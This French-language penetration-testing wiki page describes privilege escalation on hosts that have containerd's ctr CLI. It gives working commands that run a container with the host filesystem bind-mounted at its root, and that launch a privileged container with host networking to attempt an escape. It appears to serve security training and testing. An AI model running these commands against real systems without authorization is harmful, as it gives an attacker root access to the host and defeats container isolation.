# Containerd (ctr) Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Informations de base

Consultez le lien suivant pour apprendre **où `containerd` et `ctr` s'intègrent dans la stack de conteneurs** :

{{#ref}}
container-security/runtimes-and-engines.md
{{#endref}}

## PE 1

Si vous constatez qu'un hôte contient la commande `ctr`, le CLI natif fourni avec containerd :<sup>[[1]](#references)</sup>
```bash
which ctr
/usr/bin/ctr
```
Vous pouvez lister les images connues de containerd :<sup>[[2]](#references)</sup>
```bash
ctr image list
REF                                  TYPE                                                 DIGEST                                                                  SIZE      PLATFORMS   LABELS
registry:5000/alpine:latest application/vnd.docker.distribution.manifest.v2+json sha256:0565dfc4f13e1df6a2ba35e8ad549b7cb8ce6bccbc472ba69e3fe9326f186fe2 100.1 MiB linux/amd64 -
registry:5000/ubuntu:latest application/vnd.docker.distribution.manifest.v2+json sha256:ea80198bccd78360e4a36eb43f386134b837455dc5ad03236d97133f3ed3571a 302.8 MiB linux/amd64 -
```
Puis **exécutez l'une de ces images avec la racine de l'hôte montée en bind récursivement à la racine du conteneur**:<sup>[[3]](#references)[[4]](#references)</sup>
```bash
ctr run --mount type=bind,src=/,dst=/,options=rbind -t registry:5000/ubuntu:latest ubuntu bash
```
## PE 2

Lancer un container en mode privilégié et tester une escape.\
Vous pouvez lancer un container privilégié en utilisant le host networking comme suit :<sup>[[5]](#references)[[6]](#references)</sup>
```bash
ctr run --privileged --net-host -t registry:5000/modified-ubuntu:latest ubuntu bash
```
`--privileged` accorde au processus les capacités Linux effectives de l'appelant et supprime plusieurs contrôles d'isolation, mais un escape reste dépendant de l'environnement ; utilisez les techniques mentionnées dans la page suivante pour le tester :<sup>[[5]](#references)</sup>

{{#ref}}
container-security/
{{#endref}}

## References

- [1] [Premiers pas avec containerd](https://github.com/containerd/containerd/blob/main/docs/getting-started.md)
- [2] [Implémentation de la commande ctr image](https://github.com/containerd/containerd/blob/main/cmd/ctr/commands/images/images.go)
- [3] [Implémentation de la commande ctr run](https://github.com/containerd/containerd/blob/main/cmd/ctr/commands/run/run.go)
- [4] [Documentation du noyau Linux sur les sous-arborescences partagées](https://docs.kernel.org/filesystems/sharedsubtree.html)
- [5] [Package OCI de containerd : `WithPrivileged`](https://pkg.go.dev/github.com/containerd/containerd%40v1.7.33/oci)
- [6] [Options de la commande `ctr` de containerd](https://github.com/containerd/containerd/blob/main/cmd/ctr/commands/commands.go)
{{#include ../../banners/hacktricks-training.md}}
